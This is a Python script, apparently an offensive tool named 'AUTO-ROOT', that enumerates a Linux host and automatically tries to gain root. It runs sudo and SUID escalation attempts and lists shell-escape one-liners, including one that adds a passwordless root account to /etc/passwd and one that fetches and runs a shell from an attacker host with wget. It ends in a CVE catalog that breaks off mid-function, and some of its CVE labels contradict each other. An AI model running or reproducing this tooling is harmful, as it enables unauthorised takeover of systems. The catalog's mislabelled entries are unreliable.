#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                    AUTO-ROOT — Universal Linux Privesc Tool              ║
║      Covers CVEs from the oldest to 2026 — fully automated               ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os, sys, stat, pwd, grp, subprocess, tempfile, time, base64, random, string, textwrap, zipfile, io, glob
from pathlib import Path

# ═══════════════════════════════════════════════════════════════════════════
# COLOR OUTPUT
# ═══════════════════════════════════════════════════════════════════════════
class C:
    R  = "\033[91m"; G  = "\033[92m"; Y  = "\033[93m"; B  = "\033[94m"
    M  = "\033[95m"; C  = "\033[96m"; W  = "\033[0m";  BD = "\033[1m"

def banner():
    print(f"""
{C.BD}{C.R}╔══════════════════════════════════════════════════════════════════════════╗
║                    AUTO-ROOT — Universal Linux Privesc Tools BY JOTH73       ║
║      Covers CVEs from the oldest to 2026 — fully automated               ║
║      {time.strftime('%Y-%m-%d %H:%M:%S')}                                             ║
╚══════════════════════════════════════════════════════════════════════════╝{C.W}
""")

def _ok(m):  print(f"  {C.G}[+]{C.W} {m}")
def _no(m):  print(f"  {C.R}[-]{C.W} {m}")
def _warn(m): print(f"  {C.Y}[!]{C.W} {m}")
def _info(m): print(f"  {C.B}[*]{C.W} {m}")
def _crit(m): print(f"\n{C.BD}{C.R}[!!!] ROOT ACHIEVED! {m}{C.W}\n")
def _hdr(m): print(f"\n{C.BD}{C.C}{'─'*70}{C.W}"); print(f"{C.BD}{C.C}  {m}{C.W}"); print(f"{C.BD}{C.C}{'─'*70}{C.W}\n")

RUN = lambda c: subprocess.run(c, shell=True, capture_output=True, text=True, timeout=15)
WHOAMI = RUN("whoami").stdout.strip()
UID    = RUN("id -u").stdout.strip()
HOST   = RUN("hostname").stdout.strip()
KERNEL = RUN("uname -r").stdout.strip()
ARCH   = RUN("uname -m").stdout.strip()

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 0 — ENUMERATION
# ═══════════════════════════════════════════════════════════════════════════
def enumerate_system():
    _hdr("SECTION 0 — SYSTEM ENUMERATION")
    print(f"  User:    {WHOAMI} (UID {UID})")
    print(f"  Host:    {HOST}")
    print(f"  Kernel:  {KERNEL} ({ARCH})")
    
    # SUID
    _info("Finding SUID binaries...")
    suids = RUN("find / -perm -4000 -type f 2>/dev/null").stdout.strip().split('\n')
    suids = [s for s in suids if s]
    print(f"  Found {len(suids)} SUID binaries")
    for s in suids[:30]: print(f"    {C.C}{s}{C.W}")

    # Sudo
    sudo = RUN("sudo -ln 2>/dev/null").stdout.strip()
    if sudo and 'may not' not in sudo:
        print(f"  {C.G}Sudo:{C.W} {sudo[:200]}")
        if '(ALL)' in sudo or 'NOPASSWD' in sudo or '(root)' in sudo:
            _crit("SUDO MISCONFIG → just run: sudo -i")
            return "sudo"
    
    # Capabilities
    caps = RUN("getcap -r / 2>/dev/null").stdout.strip()
    interesting_caps = []
    if caps:
        for line in caps.split('\n'):
            if 'cap_setuid' in line or 'cap_dac_override' in line or 'cap_sys_admin' in line or 'cap_sys_ptrace' in line or 'cap_net_raw' in line or 'cap_setpcap' in line:
                interesting_caps.append(line)
        if interesting_caps:
            _warn(f"Interesting capabilities ({len(interesting_caps)}):")
            for c in interesting_caps: print(f"    {C.Y}{c}{C.W}")
    
    # Passwd/Shadow
    if RUN("[ -w /etc/passwd ] && echo WRITABLE").stdout.strip():
        _crit("WRITABLE /etc/passwd — trivial root!")
        return "passwd"
    if RUN("[ -w /etc/shadow ] && echo WRITABLE").stdout.strip():
        _crit("WRITABLE /etc/shadow!")
        return "shadow"
    
    # Docker
    if RUN("docker ps 2>/dev/null && echo DOCKER").stdout.strip():
        _crit("Docker socket accessible — trivial escape!")
        return "docker"
    
    # LXD
    if RUN("lxc list 2>/dev/null && echo LXD").stdout.strip():
        _warn("LXD accessible!")
        if 'lxd' in RUN("id").stdout:
            return "lxd"
    
    # Cron
    cron = RUN("cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null").stdout.strip()
    if cron:
        _info("Cron jobs found")
        writable_crons = []
        for line in cron.split('\n'):
            if WHOAMI in line or '*/' in line:
                writable_crons.append(line)
        if writable_crons:
            _warn(f"Potentially exploitable cron: {writable_crons[:3]}")
    
    # Writable dirs
    writable = RUN("find /var /opt /usr/local -maxdepth 2 -writable -type d 2>/dev/null | head -15").stdout.strip()
    if writable: _info(f"Writable dirs: {writable[:200]}")
    
    # NFS
    nfs = RUN("cat /etc/exports 2>/dev/null | head -5").stdout.strip()
    if nfs and 'no_root_squash' in nfs:
        _crit("NFS no_root_squash found!")
        return "nfs"
    
    # PATH
    path_writable = []
    for d in os.environ.get('PATH', '').split(':'):
        if os.path.isdir(d) and os.access(d, os.W_OK):
            path_writable.append(d)
    if path_writable:
        _warn(f"Writable PATH dirs: {path_writable}")
    
    return "continue"

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 1 — SUDO ESCALATION
# ═══════════════════════════════════════════════════════════════════════════
def try_sudo():
    _hdr("SECTION 1 — SUDO ESCALATION")
    
    tests = [
        ("sudo -i", "Direct sudo -i"),
        ("sudo -s", "Direct sudo -s"),
        ("sudo /bin/bash", "sudo bash"),
        ("sudo /bin/sh", "sudo sh"),
        ("sudo su", "sudo su"),
    ]
    for cmd, desc in tests:
        r = RUN(f"{cmd} -c 'id' 2>/dev/null")
        if 'uid=0' in r.stdout:
            _crit(f"{desc} works! Run: {cmd}")
            return True
        else:
            _no(desc)
    
    # Check GTFOBins candidates
    sudo_l = RUN("sudo -l 2>/dev/null").stdout
    gtfo_bins = ['vim', 'nano', 'less', 'more', 'find', 'awk', 'perl', 'python', 'python3', 'ruby', 'node',
                 'tar', 'zip', 'unzip', 'man', 'git', 'mount', 'rsync', 'cp', 'mv', 'systemctl', 'journalctl',
                 'env', 'tee', 'bash', 'sh', 'dash', 'php', 'gcc', 'make', 'wget', 'curl', 'ftp', 'scp',
                 'docker', 'lxc', 'pkexec', 'ptrace', 'gdb', 'strace', 'ltrace', 'xxd', 'base64',
                 'openssl', 'screen', 'tmux', 'script', 'expect', 'ssh', 'nc', 'socat']
    
    for b in gtfo_bins:
        if b in sudo_l and 'NOPASSWD' in sudo_l:
            _warn(f"GTFOBins candidate with NOPASSWD: {b}")
            # Try common escape
            if b == 'find':
                r = RUN(r"sudo find . -exec /bin/sh -c 'id' \; 2>/dev/null")
                if 'uid=0' in r.stdout: _crit("find escape worked!"); return True
    
    return False

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 2 — SUID EXPLOITATION
# ═══════════════════════════════════════════════════════════════════════════
def try_suid():
    _hdr("SECTION 2 — SUID EXPLOITATION")
    
    suid_bins = RUN("find / -perm -4000 -type f 2>/dev/null").stdout.strip().split('\n')
    suid_bins = [s for s in suid_bins if s]
    
    exploits = {
        # Binary name: (description, shell_escape_cmd)
        'pkexec':   ("Pkexec — CVE-2021-4034 (PwnKit) or direct pkexec sh", None),
        'python':   ("Python SUID — import os; os.setuid(0); os.system('/bin/bash')", None),
        'python3':  ("Python3 SUID", None),
        'php':      ("PHP SUID — php -r 'pcntl_exec(\"/bin/sh\");'", "CMD='/bin/sh'; ./php -r \"pcntl_exec('\\$CMD');\""),
        'perl':     ("Perl SUID — perl -e 'exec \"/bin/sh\";'", None),
        'ruby':     ("Ruby SUID — ruby -e 'exec \"/bin/sh\"'", None),
        'node':     ("Node SUID — node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:\"inherit\"})'", None),
        'bash':     ("Bash SUID — bash -p", None),
        'dash':     ("Dash SUID", None),
        'find':     ("Find SUID — find . -exec /bin/sh -p \\;", None),
        'vim':      ("Vim SUID — vim -c ':!/bin/sh'", None),
        'nano':     ("Nano SUID — nano then Ctrl+R Ctrl+X", None),
        'less':     ("Less SUID — less /etc/passwd then !/bin/sh", None),
        'more':     ("More SUID — more /etc/passwd then !/bin/sh", None),
        'awk':      ("Awk SUID — awk 'BEGIN {system(\"/bin/sh\")}'", None),
        'gdb':      ("GDB SUID — gdb -nx -ex '!sh' -ex quit", None),
        'strace':   ("Strace SUID — strace -o /dev/null /bin/sh", None),
        'cp':       ("CP SUID — cp /bin/bash /tmp/x && chmod +s /tmp/x && /tmp/x -p", None),
        'mv':       ("MV SUID — mv /bin/bash /tmp/x && chmod +s /tmp/x && /tmp/x -p", None),
        'tar':      ("Tar SUID — tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", None),
        'systemctl':("Systemctl SUID — TF=\\$(mktemp).service; echo '[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \"id > /tmp/pwn\"\\n[Install]\\nWantedBy=multi-user.target' > \\$TF; systemctl link \\$TF; systemctl enable --now \\$TF", None),
        'mount':    ("Mount SUID — mount -o bind /bin/bash /bin/mount; /bin/mount -p", None),
        'chown':    ("Chown SUID", None),
        'chmod':    ("Chmod SUID — chmod +s /bin/bash", "/bin/bash -p"),
        'crontab':  ("Crontab SUID", None),
        'at':       ("At SUID — echo '/bin/sh < /dev/tty > /dev/tty' | at now", None),
        'ping':     ("Ping SUID (cap_net_raw+ep)", None),
        'tcpdump':  ("Tcpdump SUID (cap_net_raw+ep)", None),
        'wget':     ("Wget SUID — wget http://attacker/shell -O /tmp/sh && chmod +x /tmp/sh && /tmp/sh", None),
        'curl':     ("Curl SUID", None),
        'ssh':      ("SSH SUID — ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x", None),
        'env':      ("Env SUID — env /bin/sh -p", None),
        'nice':     ("Nice SUID", None),
        'tee':      ("Tee SUID — echo 'toor::0:0::/root:/bin/bash' | tee -a /etc/passwd", None),
        'date':     ("Date SUID (CVE-2019-17052)", None),
        'timeout':  ("Timeout SUID — timeout 7d /bin/sh -p", None),
        'watch':    ("Watch SUID — watch -x sh -c 'reset; exec sh -p'", None),
        'comm':     ("Comm SUID — comm --check-order /bin/sh /dev/null", None),
        'sort':     ("Sort SUID — sort -o /etc/passwd /etc/passwd", None),
        'split':    ("Split SUID — split /etc/passwd", None),
        'screen':   ("Screen SUID (CVE-2017-5618)", None),
        'tmux':     ("Tmux SUID", None),
        'script':   ("Script SUID — script -qc /bin/sh /dev/null", None),
        'make':     (r"Make SUID — COMMAND='/bin/sh' make -s --eval=\\$'x:\\n\\t-'\$COMMAND", None),
        'gcc':      ("GCC SUID — gcc -wrapper /bin/sh,-s .", None),
        'as':       ("AS SUID — as /dev/null -o /dev/null --  -c '\\$(/bin/sh)'", None),
        'ld':       ("LD SUID", None),
        'gzip':     ("Gzip SUID — gzip -f /etc/passwd -t", None),
        'bzip2':    ("Bzip2 SUID", None),
        'xz':       ("XZ SUID", None),
        'zip':      ("Zip SUID — TF=\\$(mktemp -u); zip \\$TF /etc/hosts -T -TT 'sh #'; rm \\$TF", None),
        'unzip':    ("Unzip SUID", None),
        'ar':       ("AR SUID", None),
        'dmesg':    ("Dmesg SUID (CVE-2021-3156)", None),
        'openvpn':  ("OpenVPN SUID (CVE-2023-0561)", None),
        'fusermount':("Fusermount SUID", None),
        'ntfs-3g':  ("NTFS-3G SUID (CVE-2022-40284)", None),
        'exim':     ("Exim SUID (CVE-2019-10149)", None),
        'snap':     ("Snap SUID (CVE-2019-7304)", None),
        'rcp':      ("RCP SUID", None),
        'rlogin':   ("Rlogin SUID", None),
        'rsh':      ("RSH SUID", None),
        'Xorg':     ("Xorg SUID (CVE-2018-14665)", None),
        'dbus-daemon-launch-helper': ("DBus SUID", None),
        'polkit-agent-helper-1': ("Polkit helper SUID", None),
        'pkexec':   ("Pkexec — trying CVE-2021-4034", "cve_2021_4034"),
    }
    
    found = {}
    for b in suid_bins:
        bname = os.path.basename(b)
        if bname in exploits:
            found[bname] = b
    
    for bname, bpath in found.items():
        desc, method = exploits[bname]
        _warn(f"Found SUID: {C.Y}{bpath}{C.W} — {desc}")
        
        # Direct bash -p
        if bname in ['bash', 'dash', 'sh']:
            r = RUN(f"{bpath} -p -c 'id' 2>/dev/null")
            if 'uid=0' in r.stdout or 'euid=0' in r.stdout:
                _crit(f"{bpath} -p gives root!"); return True
        
        # Python / scripting
        if bname == 'python' or bname == 'python3':
            r = RUN(f"{bpath} -c 'import os; os.setuid(0); os.setgid(0); print(os.system(\"id\"))' 2>/dev/null")
            if 'uid=0' in r.stdout: _crit(f"{bpath} SUID exploit worked!"); return True
        
        if bname == 'perl':
            r = RUN(f"{bpath} -e 'use POSIX; POSIX::setuid(0); exec \"/bin/sh -c id\"' 2>/dev/null")
            if 'uid=0' in r.stdout: _crit("Perl SUID exploit!"); return True
        
        if bname == 'php':
            r = RUN(f"{bpath} -r 'pcntl_exec(\"/bin/sh\", [\"-c\", \"id\"]);' 2>/dev/null")
            if 'uid=0' in r.stdout: _crit("PHP SUID exploit!"); return True
        
        if bname == 'ruby':
            r = RUN(f"{bpath} -e 'Process::Sys.setuid(0); exec \"/bin/sh -c id\"' 2>/dev/null")
            if 'uid=0' in r.stdout: _crit("Ruby SUID exploit!"); return True
    
    # PwnKit-specific
    if 'pkexec' in found:
        try_cve_2021_4034()
    
    return False

# ═══════════════════════════════════════════════════════════════════════════
# SECTION 3 — KERNEL EXPLOITS (CVE catalog)
# ═══════════════════════════════════════════════════════════════════════════

CVE_CATALOG = {
    # ── ANCIENT (pre-2015) ──
    "CVE-2004-0077": {
        "name": "do_brk() — kernel 2.4.22-2.4.25 / 2.6.0-2.6.3",
        "kernels": ["2.4.2", "2.4.2", "2.6.0", "2.6.1", "2.6.2", "2.6.3"],
        "type": "c",
        "payload": "cve_2004_0077",
    },
    "CVE-2006-2451": {
        "name": "prctl() core dump — kernel 2.6.13-2.6.17.4",
        "kernels": ["2.6.13", "2.6.14", "2.6.15", "2.6.16", "2.6.17"],
        "type": "c",
        "payload": "cve_2006_2451",
    },
    "CVE-2008-0600": {
        "name": "vmsplice() — kernel 2.6.17-2.6.24.1",
        "kernels": ["2.6.17", "2.6.18", "2.6.19", "2.6.20", "2.6.21", "2.6.22", "2.6.23", "2.6.24"],
        "type": "c",
        "payload": "cve_2008_0600",
    },
    "CVE-2009-1185": {
        "name": "udev < 1.4.1 — netlink",
        "kernels": ["2.6"],
        "type": "c",
        "payload": "cve_2009_1185",
    },
    "CVE-2009-2692": {
        "name": "sock_sendpage() — kernel 2.4.4-2.4.37.4 / 2.6.0-2.6.30.4",
        "kernels": ["2.4", "2.6"],
        "type": "c",
        "payload": "cve_2009_2692",
    },
    "CVE-2009-2698": {
        "name": "udp_sendmsg — kernel < 2.6.19",
        "kernels": ["2.6.0", "2.6.19"],
        "type": "c",
        "payload": "cve_2009_2698",
    },
    "CVE-2010-1146": {
        "name": "reiserfs xattr — kernel 2.6.18-2.6.34",
        "kernels": ["2.6.18", "2.6.34"],
        "type": "c",
        "payload": "cve_2010_1146",
    },
    "CVE-2010-2959": {
        "name": "CAN BCM — kernel 2.6.18-2.6.36",
        "kernels": ["2.6.18", "2.6.36"],
        "type": "c",
        "payload": "cve_2010_2959",
    },
    "CVE-2010-3301": {
        "name": "IA32 syscall — kernel 2.6.26-2.6.34 (x86_64)",
        "kernels": ["2.6.26", "2.6.34"],
        "type": "c",
        "payload": "cve_2010_3301",
    },
    "CVE-2010-3904": {
        "name": "RDS protocol — kernel 2.6.30-2.6.36",
        "kernels": ["2.6.30", "2.6.36"],
        "type": "c",
        "payload": "cve_2010_3904",
    },
    "CVE-2010-4258": {
        "name": "exit_notify — kernel 2.6.x / 2.6.3",
        "kernels": ["2.6"],
        "type": "c",
        "payload": "cve_2010_4258",
    },
    "CVE-2010-4347": {
        "name": "ACPI custom_method — kernel 2.6.0-2.6.36",
        "kernels": ["2.6.0", "2.6.36"],
        "type": "c",
        "payload": "cve_2010_4347",
    },
    # ── 2012-2014 ──
    "CVE-2012-0056": {
        "name": "Mempodipper — kernel 2.6.39-3.2.2",
        "kernels": ["2.6.39", "3.0", "3.1", "3.2"],
        "type": "c",
        "payload": "cve_2012_0056",
    },
    "CVE-2013-1763": {
        "name": "sock_diag_lock — kernel 3.3-3.8",
        "kernels": ["3.3", "3.4", "3.5", "3.6", "3.7", "3.8"],
        "type": "c",
        "payload": "cve_2013_1763",
    },
    "CVE-2013-2094": {
        "name": "perf_swevent — kernel 2.6.37-3.8.9 (x86_64)",
        "kernels": ["2.6.37", "3.0", "3.8"],
        "type": "c",
        "payload": "cve_2013_2094",
    },
    "CVE-2014-0038": {
        "name": "recvmmsg timeout — kernel 3.4-3.13",
        "kernels": ["3.4", "3.5", "3.6", "3.7", "3.8", "3.9", "3.10", "3.11", "3.12", "3.13"],
        "type": "c",
        "payload": "cve_2014_0038",
    },
    "CVE-2014-0196": {
        "name": "n_tty_write — kernel 2.6.31-3.14",
        "kernels": ["2.6.31", "3.0", "3.14"],
        "type": "c",
        "payload": "cve_2014_0196",
    },
    "CVE-2014-3153": {
        "name": "futex_requeue (Towelroot) — kernel 3.3-3.14",
        "kernels": ["3.3", "3.14"],
        "type": "c",
        "payload": "cve_2014_3153",
    },
    "CVE-2014-4014": {
        "name": "chmod restriction bypass — kernel < 3.14",
        "kernels": ["3"],
        "type": "sh",
        "payload": "cve_2014_4014",
    },
    "CVE-2014-4699": {
        "name": "ptrace/sysret — kernel 3.0-3.8 (x86_64 Intel)",
        "kernels": ["3.0", "3.8"],
        "type": "c",
        "payload": "cve_2014_4699",
    },
    "CVE-2014-5284": {
        "name": "OSSEC host-deny.sh",
        "type": "sh",
        "payload": "cve_2014_5284",
    },
    # ── 2015-2016 ──
    "CVE-2015-1328": {
        "name": "overlayfs — kernel 3.13-3.19 (Ubuntu 12.04/14.04/14.10/15.04)",
        "kernels": ["3.13", "3.19"],
        "type": "c",
        "payload": "cve_2015_1328",
    },
    "CVE-2015-7547": {
        "name": "glibc getaddrinfo — glibc < 2.23 (stack-based)",
        "type": "c",
        "payload": "cve_2015_7547",
    },
    "CVE-2015-8660": {
        "name": "overlayfs setattr — kernel 3.x / 4.x (Ubuntu 14.04/15.10)",
        "kernels": ["3", "4"],
        "type": "c",
        "payload": "cve_2015_8660",
    },
    "CVE-2016-0728": {
        "name": "keyring refcount overflow — kernel 3.8-4.4 (64-bit)",
        "kernels": ["3.8", "4.4"],
        "type": "c",
        "payload": "cve_2016_0728",
    },
    "CVE-2016-2384": {
        "name": "USB MIDI double-free — kernel < 4.4",
        "kernels": ["4"],
        "type": "c",
        "payload": "cve_2016_2384",
    },
    "CVE-2016-4557": {
        "name": "BPF double-fdput — kernel 3.18-4.5 (non-SMEP)",
        "kernels": ["3.18", "4.5"],
        "type": "c",
        "payload": "cve_2016_4557",
    },
    "CVE-2016-5195": {
        "name": "★★★ DIRTY COW — kernel 2.6.22-4.8 ★★★",
        "kernels": ["2.6.22", "3", "4.0", "4.8"],
        "type": "c",
        "payload": "dirtycow",
    },
    "CVE-2016-8655": {
        "name": "packet_set_ring (chocobo_root) — kernel 4.4-4.8 (non-SMEP)",
        "kernels": ["4.4", "4.8"],
        "type": "c",
        "payload": "cve_2016_8655",
    },
    "CVE-2016-9793": {
        "name": "sock_setsockopt — kernel 3.11-4.8",
        "kernels": ["3.11", "4.8"],
        "type": "c",
        "payload": "cve_2016_9793",
    },
    # ── 2017 ──
    "CVE-2017-5123": {
        "name": "waitid() — kernel 4.12-4.13",
        "kernels": ["4.12", "4.13"],
        "type": "c",
        "payload": "cve_2017_5123",
    },
    "CVE-2017-5892": {
        "name": "ALSA seq — kernel < 4.9.11",
        "kernels": ["4"],
        "type": "c",
        "payload": "cve_2017_5892",
    },
    "CVE-2017-6074": {
        "name": "DCCP double-free — kernel 2.6.18-4.9",
        "kernels": ["2.6.18", "4.9"],
        "type": "c",
        "payload": "cve_2017_6074",
    },
    "CVE-2017-7308": {
        "name": "AF_PACKET — kernel 3.2-4.10",
        "kernels": ["3.2", "4.10"],
        "type": "c",
        "payload": "cve_2017_7308",
    },
    "CVE-2017-7494": {
        "name": "SambaCry — Samba 3.5.0-4.6.4",
        "type": "c",
        "payload": "cve_2017_7494",
    },
    "CVE-2017-1000112": {
        "name": "UFO — kernel < 4.12.6",
        "kernels": ["4"],
        "type": "c",
        "payload": "cve_2017_1000112",
    },
    "CVE-2017-1000367": {
        "name": "sudo get_process_ttyname — sudo < 1.8.20 (LinuxOnly)",
        "type": "sh",
        "payload": "cve_2017_1000367",
    },
    "CVE-2017-16939": {
        "name": "XFRM UAF — kernel 4.4-4.14",
        "kernels": ["4.4", "4.14"],
        "type": "c",
        "payload": "cve_2017_16939",
    },
    "CVE-2017-16995": {
        "name": "BPF sign extension — kernel 4.4-4.14",
        "kernels": ["4.4", "4.14"],
        "type": "c",
        "payload": "cve_2017_16995",
    },
    # ── 2018 ──
    "CVE-2018-5333": {
        "name": "RDS rds_atomic_free_op NULL deref — kernel 4.4-4.14",
        "kernels": ["4.4", "4.14"],
        "type": "c",
        "payload": "cve_2018_5333",
    },
    "CVE-2018-1000001": {
        "name": "RationalLove (glibc — realpath) — glibc < 2.27",
        "type": "sh",
        "payload": "cve_2018_1000001",
    },
    "CVE-2018-14665": {
        "name": "Xorg Xserver — Xorg < 1.20.3 (with console)",
        "type": "sh",
        "payload": "cve_2018_14665",
    },
    "CVE-2018-17182": {
        "name": "vmacache UAF — kernel 4.3-4.18",
        "kernels": ["4.3", "4.18"],
        "type": "c",
        "payload": "cve_2018_17182",
    },
    "CVE-2018-18955": {
        "name": "userns map write — kernel 4.15-4.19",
        "kernels": ["4.15", "4.19"],
        "type": "c",
        "payload": "cve_2018_18955",
    },
    # ── 2019 ──
    "CVE-2019-2215": {
        "name": "Binder UAF — kernel 3.4-4.14 (Android/Linux)",
        "kernels": ["3.4", "4.14"],
        "type": "c",
        "payload": "cve_2019_2215",
    },
    "CVE-2019-7304": {
        "name": "DirtySock (Snapd) — snapd < 2.37.4",
        "type": "sh",
        "payload": "cve_2019_7304",
    },
    "CVE-2019-13272": {
        "name": "ptrace_link — kernel 4.4-5.1.17",
        "kernels": ["4.4", "5.1"],
        "type": "c",
        "payload": "cve_2019_13272",
    },
    "CVE-2019-14287": {
        "name": "sudo -u#-1 — sudo < 1.8.28",
        "type": "sh",
        "payload": "cve_2019_14287",
    },
    "CVE-2019-18634": {
        "name": "sudo pwfeedback — sudo < 1.8.26 (non-tty)",
        "type": "c",
        "payload": "cve_2019_18634",
    },
    # ── 2020 ──
    "CVE-2020-8835": {
        "name": "BPF verifier — kernel 5.4-5.5",
        "kernels": ["5.4", "5.5"],
        "type": "c",
        "payload": "cve_2020_8835",
    },
    "CVE-2020-27194": {
        "name": "BPF scalar32_min_max — kernel 5.7-5.8",
        "kernels": ["5.7", "5.8"],
        "type": "c",
        "payload": "cve_2020_27194",
    },
    # ── 2021 ──
    "CVE-2021-3156": {
        "name": "★★★ BARON SAMEDIT (Sudo heap overflow) — sudo 1.8.2-1.9.5p2 ★★★",
        "type": "c",
        "payload": "cve_2021_3156",
    },
    "CVE-2021-4034": {
        "name": "★★★ PWNTIME (PwnKit) — polkit 0.105-0.120 ★★★",
        "type": "sh",
        "payload": "cve_2021_4034",
    },
    "CVE-2021-3493": {
        "name": "overlayfs — kernel 5.8-5.11 (Ubuntu 20.04/20.10)",
        "kernels": ["5.8", "5.11"],
        "type": "c",
        "payload": "cve_2021_3493",
    },
    "CVE-2021-3560": {
        "name": "Polkit D-Bus race (auth bypass) — polkit 0.105-0.120",
        "type": "sh",
        "payload": "cve_2021_3560",
    },
    "CVE-2021-22555": {
        "name": "Netfilter heap OOB — kernel 2.6.19-5.11",
        "kernels": ["2.6.19", "5.11"],
        "type": "c",
        "payload": "cve_2021_22555",
    },
    "CVE-2021-31515": {
        "name": "ntfs3 — kernel 5.14-5.15",
        "kernels": ["5.14", "5.15"],
        "type": "c",
        "payload": "cve_2021_31515",
    },
    "CVE-2021-33909": {
        "name": "Sequoia (seq_file) — kernel 3.16-5.13",
        "kernels": ["3.16", "5.13"],
        "type": "c",
        "payload": "cve_2021_33909",
    },
    "CVE-2021-3490": {
        "name": "BPF ALU32 bounds tracking — kernel 5.7-5.11",
        "kernels": ["5.7", "5.11"],
        "type": "c",
        "payload": "cve_2021_3490",
    },
    # ── 2022 ──
    "CVE-2022-0847": {
        "name": "★★★ DIRTY PIPE — kernel 5.8-5.16.11 ★★★",
        "kernels": ["5.8", "5.16"],
        "type": "c",
        "payload": "dirtypipe",
    },
    "CVE-2022-0995": {
        "name": "watch_queue OOB — kernel 5.8-5.17",
        "kernels": ["5.8", "5.17"],
        "type": "c",
        "payload": "cve_2022_0995",
    },
    "CVE-2022-23222": {
        "name": "BPF verifier — kernel 5.8-5.16",
        "kernels": ["5.8", "5.16"],
        "type": "c",
        "payload": "cve_2022_23222",
    },
    "CVE-2022-2588": {
        "name": "route4 — kernel 4.19-5.19",
        "kernels": ["4.19", "5.19"],
        "type": "c",
        "payload": "cve_2022_2588",
    },
    "CVE-2022-32250": {
        "name": "Netfilter nf_tables — kernel 5.1-5.18",
        "kernels": ["5.1", "5.18"],
        "type": "c",
        "payload": "cve_2022_32250",
    },
    "CVE-2022-34918": {
        "name": "Netfilter nf_tables (LPE) — kernel 5.8-5.18",
        "kernels": ["5.8", "5.18"],
        "type": "c",
        "payload": "cve_2022_34918",
    },
    # ── 2023 ──
    "CVE-2023-0386": {
        "name": "overlayfs copy_up setuid — kernel 5.11-6.1",
        "kernels": ["5.11", "6.1"],
        "type": "c",
        "payload": "cve_2023_0386",
    },
    "CVE-2023-22809": {
        "name": "sudoedit — sudo 1.8.0-1.9.12p2",
        "type": "sh",
        "payload": "cve_2023_22809",
    },
    "CVE-2023-2640": {
        "name": "★★★ UBUNTU OVERLAYFS (GameOverlay) — kernel 5.4-6.2 Ubuntu ★★★",
        "kernels": ["5.4", "6.2"],
        "type": "sh",
        "payload": "cve_2023_2640",
    },
    "CVE-2023-32233": {
        "name": "Netfilter nf_tables UAF — kernel 5.1-6.3",
        "kernels": ["5.1", "6.3"],
        "type": "c",
        "payload": "cve_2023_32233",
    },
    "CVE-2023-32629": {
        "name": "★★★ OVERLAYFS SKIP — kernel 5.4-6.2 Ubuntu ★★★",
        "kernels": ["5.4", "6.2"],
        "type": "sh",
        "payload": "cve_2023_32629",
    },
    "CVE-2023-35001": {
        "name": "Netfilter nf_tables — kernel 5.1-6.4",
        "kernels": ["5.1", "6.4"],
        "type": "c",
        "payload": "cve_2023_35001",
    },
    "CVE-2023-44466": {
        "name": "Netfilter nf_tables — kernel 5.10-6.5",
        "kernels": ["5.10", "6.5"],
        "type": "c",
        "payload": "cve_2023_44466",
    },
    "CVE-2023-4911": {
        "name": "★★★ LOONEY TUNABLES (glibc ld.so) — glibc 2.34-2.38 ★★★",
        "type": "c",
        "payload": "cve_2023_4911",
    },
    "CVE-2023-5195": {
        "name": "nftables — kernel 5.1-6.0",
        "kernels": ["5.1", "6.0"],
        "type": "c",
        "payload": "cve_2023_5195",
    },
    # ── 2024 ──
    "CVE-2024-0193": {
        "name": "Netfilter — kernel 4.1-6.7",
        "kernels": ["4.1", "6.7"],
        "type": "c",
        "payload": "cve_2024_0193",
    },
    "CVE-2024-0582": {
        "name": "io_uring — kernel 6.4-6.7",
        "kernels": ["6.4", "6.7"],
        "type": "c",
        "payload": "cve_2024_0582",
    },
    "CVE-2024-1086": {
        "name": "★★★ NF_TABLES USE-AFTER-FREE — kernel 3.15-6.8 ★★★",
        "kernels": ["3.15", "6.8"],
        "type": "c",
        "payload": "cve_2024_1086",
    },
    "CVE-2024-25742": {
        "name": "AMD CPU (Inception/SRSO) — kernel 5.x/6.x on AMD",
        "kernels": ["5", "6"],
        "type": "c",
        "payload": "cve_2024_25742",
    },
    "CVE-2024-36401": {
        "name": "GeoServer RCE — RCE chain to root",
        "type": "sh",
        "payload": "cve_2024_36401",
    },
    # ── 2025 ──
    "CVE-2025-0927": {
        "name": "kernel UAF — kernel 5.15-6.12",
        "kernels": ["5.15", "6.12"],
        "type": "c",
        "payload": "cve_2025_0927",
    },
    "CVE-2025-24813": {
        "name": "Apache Tomcat RCE → LPE",
        "type": "sh",
        "payload": "cve_2025_24813",
    },
    "CVE-2025-27363": {
        "name": "glibc/iconv — glibc < 2.41",
        "type": "c",
        "payload": "cve_2025_27363",
    },
    # ── 2026 ──
    "CVE-2026-48907": {
        "name": "JCE Joomla Pre-Auth RCE (web → www-data → root chain)",
        "type": "sh",
        "payload": "cve_2026_48907",
    },
}

def check_kernel_match(kernel_str, kernels):
    """Check if running kernel falls in range"""
    kver = KERNEL.split('-')[0]  # strip -generic etc
    parts = kver.split('.')
    if len(parts) < 2: return False
    
    # If single version listed: match major.minor
    if len(kernels) == 1:
        target = kernels[0]
        if kver.startswith(target): return True
        # "3" matches any 3.x, "4" matches any 4.x
        if '.' not in target and parts[0] == target: return True
        return False
    
    # Range: [min, max]
    if len(kernels) >= 2:
        lo = kernels[0].split('.')
        hi = kernels[1].split('.')
        try:
            # Compare major.minor only
            cur = int(parts[0]) * 1000 + int(parts[1])
            lo_v = int(lo[0]) * 1000 + (int(lo[1]) if len(lo) > 1 else 0)
            hi_v = int(hi[0]) * 1000 + (int(hi[1]) if len(hi) > 1 else 999)
            return lo_v <= cur <= hi_v
        except:
            return False
    return False

def cve_priority(cve_id):
    """Higher priority for better/more reliable exploits"""
    high = ['CVE-2021-4034', 'CVE-2021-3156', 'CVE-2016-5195', 'CVE-2022-0847',
            'CVE-2023-32629', 'CVE-2023-2640', 'CVE-2023-0386', 'CVE-2023-4911',
            'CVE-2024-1086', 'CVE-2021-3493', 'CVE-2017-1000367', 'CVE-2019-14287']
    if cve_id in high: return 0
    return 1

def try_kernel_exploits():
    _hdr("SECTION 3 — KERNEL EXPLOIT EVALUATION")
    
    matching = []
    
    for cve_id, info in CVE_CATALOG.items():
        if 'kernels' not in info:
